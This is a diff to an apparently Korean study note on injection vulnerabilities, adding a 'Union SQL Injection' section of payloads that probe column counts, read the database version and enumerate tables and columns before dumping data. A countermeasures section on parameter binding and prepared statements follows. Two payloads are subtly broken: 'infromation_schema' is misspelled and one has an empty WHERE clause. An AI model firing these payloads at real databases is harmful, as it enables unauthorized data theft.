@@ -23,6 +23,20 @@ SQL, NoSQL, OS 명령, ORM(Object Relational Mapping), LDAP, EL(Expression Langu
 
 <br>
 
+## Union SQL Injection
+```
+' and db_name() > 1 --
+' union select null --
+' union select null,null --
+' union select null,null,null --
+' union select @@version --
+' union select table_name,null,null from infromation_schema.tables --
+' union select column_name,null,null from infromation_schema.columns where = '[table_name]' --
+' union select [column_name],null,null from [table_name] --
+```
+
+<br>
+
 ## 대응방안
 ### # 매개변수 바인딩 & 저장프로시저 & prepared statement
 <br>
